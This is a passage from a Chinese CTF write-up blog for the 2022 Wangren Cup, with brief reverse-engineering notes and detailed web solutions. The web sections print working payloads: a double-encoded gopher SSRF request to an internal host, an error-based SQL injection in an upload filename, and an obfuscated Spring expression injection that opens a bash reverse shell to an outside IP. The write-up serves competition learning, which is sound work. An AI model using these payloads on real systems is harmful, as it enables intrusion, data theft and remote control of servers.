/>总忘记密码，看来是存在哪里了….<br /><img src="/images/CTF/2022-第二届网刃杯/image-63.png" alt="image.png"><br />发现 md5 密文<br /><img src="/images/CTF/2022-第二届网刃杯/image-64.png" alt="image.png"><br />结束！！<br /><img src="/images/CTF/2022-第二届网刃杯/image-65.png" alt="image.png"><br><a href=""><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="20220428_185510.mp4 (71.56MB)"></a><a name="H5bTW"></a></p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><p><a name="QmDeH"></a></p><h3 id="1-ez-algorithm"><a href="#1-ez-algorithm" class="headerlink" title="1.ez_algorithm"></a>1.ez_algorithm</h3><p><a name="ilFqy"></a></p><h3 id="2-freestyle"><a href="#2-freestyle" class="headerlink" title="2.freestyle"></a>2.freestyle</h3><p>010 editor 打开 文件开头为 elf ，那就运行一下<br />ida 打开查看主要函数，发现调用了两个函数 fun1 fun2 <br /><img src="/images/CTF/2022-第二届网刃杯/image-66.png" alt="image.png"><br />继续跟进函数<br /><img src="/images/CTF/2022-第二届网刃杯/image-67.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-68.png" alt="image.png"><br />不愧是数学题~计算一下求MD5就可以了<br /><img src="/images/CTF/2022-第二届网刃杯/image-69.png" alt="image.png"><br><a name="Bn0Ux"></a></p><h3 id="3-Re-function"><a href="#3-Re-function" class="headerlink" title="3.Re_function"></a>3.Re_function</h3><p><a name="oCQiL"></a></p><h3 id="4-定时启动"><a href="#4-定时启动" class="headerlink" title="4.定时启动"></a>4.定时启动</h3><p>卡时间卡了很久，唉~~~<br /><img src="/images/CTF/2022-第二届网刃杯/image-70.png" alt="image.png"></p><p><a name="vJr5Y"></a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p><a name="YqPlc"></a></p><h3 id="signin-ssrf"><a href="#signin-ssrf" class="headerlink" title="signin(ssrf)"></a>signin(ssrf)</h3><p><img src="/images/CTF/2022-第二届网刃杯/image-71.png" alt="image.png"></p><ol><li>file:// 协议</li><li>http(s):// 协议</li><li>dict:协议</li><li>gopher 协议</li></ol><p>伪协议读取文件 file<br /><img src="/images/CTF/2022-第二届网刃杯/image-72.png" alt="image.png"><br />发现内网网段，估计是利用 gopher 协议了…<br /><img src="/images/CTF/2022-第二届网刃杯/image-73.png" alt="image.png"><br />发现很多内网主机，fuzz 吧<br /><img src="/images/CTF/2022-第二届网刃杯/image-74.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-75.png" alt="image.png"><br />爆破出来 172.73.23.100 这个主机<br /><img src="/images/CTF/2022-第二届网刃杯/image-76.png" alt="image.png"><br />根据提示 传入 a<br /><img src="/images/CTF/2022-第二届网刃杯/image-77.png" alt="image.png"><br><a name="DtsCO"></a></p><h4 id="gopher-协议"><a href="#gopher-协议" class="headerlink" title="gopher 协议"></a>gopher 协议</h4><p><strong>格式：url:gopher://<host>:<port>/<gopher-path>_TCP数据流（GET/POST）</strong><br />如果是 post 请求，回车需要使用 <strong>%0d%0a </strong>参数和参数之间也需要 URL编码</p><p><strong>payload 需要进行 url-encode 两次</strong><br /><strong>需要全选构造的 payload （因为是 post）</strong><br /><img src="/images/CTF/2022-第二届网刃杯/image-78.png" alt="image.png"><br />payload：</p><ol><li>构造 post 请求 的数据包</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.73.23.100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">b</span><span class="operator">=</span><span class="number">2</span></span></span><br></pre></td></tr></table></figure><ol><li>进行 url-encode 两次</li><li><p>拼接到 url 后面 </p><p><a href="http://124.222.24.150:8091/?url=gopher://172.73.23.100:80/_"><strong>http://124.222.24.150:8091/?url=gopher://172.73.23.100:80/_</strong></a><strong> + url_encode_data(GET/POST)</strong><br /><img src="/images/CTF/2022-第二届网刃杯/image-79.png" alt="image.png"><br />POST 好像少了点东西，加入 <strong>X-Forwarded-For:127.0.0.1</strong></p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.73.23.100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">b</span><span class="operator">=</span><span class="number">2</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2022-第二届网刃杯/image-80.png" alt="image.png"><br />continue….  join <strong>Referer:bolean.club</strong><br /><strong>referer 是代表 请求是从 这个网址过来的  bolean.club</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.73.23.100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bolean.club</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">b</span><span class="operator">=</span><span class="number">2</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2022-第二届网刃杯/image-81.png" alt="image.png"><br />finally_payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.222.24.150:8091/?url=gopher://172.73.23.100:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%33%66%25%36%31%25%33%64%25%33%31%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%33%25%32%65%25%33%32%25%33%33%25%32%65%25%33%31%25%33%30%25%33%30%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%35%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%31%25%33%30%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%33%62%25%32%30%25%37%32%25%37%36%25%33%61%25%33%39%25%33%39%25%32%65%25%33%30%25%32%39%25%32%30%25%34%37%25%36%35%25%36%33%25%36%62%25%36%66%25%32%66%25%33%32%25%33%30%25%33%31%25%33%30%25%33%30%25%33%31%25%33%30%25%33%31%25%32%30%25%34%36%25%36%39%25%37%32%25%36%35%25%36%36%25%36%66%25%37%38%25%32%66%25%33%39%25%33%39%25%32%65%25%33%30%25%30%64%25%30%61%25%35%38%25%32%64%25%34%36%25%36%66%25%37%32%25%37%37%25%36%31%25%37%32%25%36%34%25%36%35%25%36%34%25%32%64%25%34%36%25%36%66%25%37%32%25%33%61%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%38%25%37%34%25%36%64%25%36%63%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%36%25%36%39%25%36%36%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%37%37%25%36%35%25%36%32%25%37%30%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%30%25%36%65%25%36%37%25%32%63%25%32%61%25%32%66%25%32%61%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%33%25%36%39%25%36%37%25%36%65%25%36%35%25%36%34%25%32%64%25%36%35%25%37%38%25%36%33%25%36%38%25%36%31%25%36%65%25%36%37%25%36%35%25%33%62%25%37%36%25%33%64%25%36%32%25%33%33%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%30%64%25%30%61%25%35%32%25%36%35%25%36%36%25%36%35%25%37%32%25%36%35%25%37%32%25%33%61%25%32%30%25%36%32%25%36%66%25%36%63%25%36%35%25%36%31%25%36%65%25%32%65%25%36%33%25%36%63%25%37%35%25%36%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%64%25%30%61%25%30%64%25%30%61%25%36%32%25%33%64%25%33%32%25%30%64%25%30%61</span><br></pre></td></tr></table></figure><p><a href=""><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="20220428_110255.mp4 (48.88MB)"></a><a name="rTHb2"></a></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p><strong>这里文件的 hint 为  SQL注入 永远的神~</strong><br />先传一个 phpinfo 试试（明知道不可以…）<br /><img src="/images/CTF/2022-第二届网刃杯/image-82.png" alt="image.png"><br />那就改 context-type <br /><img src="/images/CTF/2022-第二届网刃杯/image-83.png" alt="image.png"><br />想到了 hint <strong>SQL注入</strong>，加了单引号，<strong>报错注入</strong>！！！！这里是 insert 注入<br /><img src="/images/CTF/2022-第二届网刃杯/image-84.png" alt="image.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.24.150:8001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------32425959201085509701569429780</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>295</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://124.222.24.150:8001</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://124.222.24.150:8001/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32425959201085509701569429780</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upfile&quot;</span>; filename=<span class="string">&quot;1.php&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and &#x27;1&#x27;=&#x27;1&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: ctf</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span>info();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32425959201085509701569429780</span>--</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php&#x27; and (updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.24.150:8001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------32425959201085509701569429780</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>313</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://124.222.24.150:8001</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://124.222.24.150:8001/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32425959201085509701569429780</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upfile&quot;</span>; filename=<span class="string">&quot;1.php&#x27; and (updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)) and &#x27;1&#x27;=&#x27;1&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: ctf</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span>info();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32425959201085509701569429780</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2022-第二届网刃杯/image-85.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-86.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-87.png" alt="image.png"><br />flag{5937a0b90b5966939cccd369291c68aa}<br><a href=""><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="20220428_101854.mp4 (19.74MB)"></a><a name="OCcZb"></a></p><h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p><img src="/images/CTF/2022-第二届网刃杯/image-88.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-89.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-90.png" alt="image.png"><br />同样的方式 down 下来</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=#&#123;T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp;/dev/tcp/146.56.149.227/10022 0&gt;&amp;1&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test388</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.173.163:8022</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8238F74DDCDE5A0ED8C862BC1D78B1DA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>977</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">name=#&#123;<span class="built_in">T</span>(String)<span class="selector-class">.getClass</span>()<span class="selector-class">.forName</span>(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)<span class="selector-class">.getMethod</span>(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,<span class="built_in">T</span>(String<span class="selector-attr">[]</span>))<span class="selector-class">.invoke</span>(<span class="built_in">T</span>(String)<span class="selector-class">.getClass</span>()<span class="selector-class">.forName</span>(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)<span class="selector-class">.getMethod</span>(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>)<span class="selector-class">.invoke</span>(<span class="built_in">T</span>(String)<span class="selector-class">.getClass</span>()<span class="selector-class">.forName</span>(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),new String<span class="selector-attr">[]</span>&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp;/dev/tcp/VPS/10022 0&gt;&amp;1&quot;</span>&#125;)&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2022-第二届网刃杯/image-91.png" alt="image.png"></p><p>还有一种方式<br />payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test388</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.173.163:8022</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8238F74DDCDE5A0ED8C862BC1D78B1DA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>290</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">name=#&#123;<span class="constructor">T(String)</span>.get<span class="constructor">Class()</span>.<span class="keyword">for</span><span class="constructor">Name(<span class="string">&quot;java.l&quot;</span>%2b<span class="string">&quot;ang.Ru&quot;</span>%2b<span class="string">&quot;ntime&quot;</span>)</span>.get<span class="constructor">Method(<span class="string">&quot;ex&quot;</span>%2b<span class="string">&quot;ec&quot;</span>,T(String[])</span>).invoke(<span class="constructor">T(String)</span>.get<span class="constructor">Class()</span>.<span class="keyword">for</span><span class="constructor">Name(<span class="string">&quot;java.l&quot;</span>%2b<span class="string">&quot;ang.Ru&quot;</span>%2b<span class="string">&quot;ntime&quot;</span>)</span>.get<span class="constructor">Method(<span class="string">&quot;getRu&quot;</span>%2b<span class="string">&quot;ntime&quot;</span>)</span>.invoke(<span class="constructor">T(String)</span>.get<span class="constructor">Class()</span>.<span class="keyword">for</span><span class="constructor">Name(<span class="string">&quot;java.l&quot;</span>%2b<span class="string">&quot;ang.Ru&quot;</span>%2b<span class="string">&quot;ntime&quot;</span>)</span>),<span class="keyword">new</span> String<span class="literal">[]</span>&#123;<span class="string">&quot;whoami&quot;</span>&#125;)&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2022-第二届网刃杯/image-92.png" alt="image.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test388</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.173.163:8022</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8238F74DDCDE5A0ED8C862BC1D78B1DA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>203</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">name=#&#123;<span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(<span class="params">new</span> <span class="params">java</span>.<span class="params">io</span>.InputStreamReader(<span class="params">new</span> ProcessBuilder(<span class="params">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span 